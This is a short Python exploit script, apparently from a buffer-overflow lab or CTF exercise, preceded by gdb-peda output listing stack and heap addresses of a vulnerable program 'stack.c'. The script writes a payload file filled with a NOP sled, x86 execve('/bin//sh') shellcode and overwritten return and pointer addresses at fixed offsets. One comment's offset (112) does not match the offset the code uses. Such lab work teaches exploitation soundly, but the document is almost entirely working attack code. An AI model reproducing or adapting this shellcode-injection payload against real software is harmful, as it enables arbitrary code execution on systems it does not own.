# gdb-peda$ p &(*user)
# $1 = (User *) 0x5655c860
# gdb-peda$ p &user
# $2 = (User **) 0xffffbaf8
# gdb-peda$ p &(*service)
# $3 = (Service *) 0x5655c850
# gdb-peda$ p &service 
# $4 = (Service **) 0xffffbafc
# gdb-peda$ p &username 
# $5 = (char (*)[470]) 0xffffb922
# gdb-peda$ p $ebp
# $6 = (void *) 0xffffbb08
# gdb-peda$ b inside_dark_web 
# Breakpoint 2 at 0x5655628d: file stack.c, line 26.
import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
filesize = 1134
content = bytearray(0x90 for i in range(1134)) 
# Put the shellcode at the end 
start = filesize - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0x5655628d 
offset = 490
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 
 
ret = 0x5655c860 
offset = 470
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 
 
ret = 0x5655c850 
offset = 474
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 

ret = 0xffffccea 
offset = 498
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 
 

# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(content) 



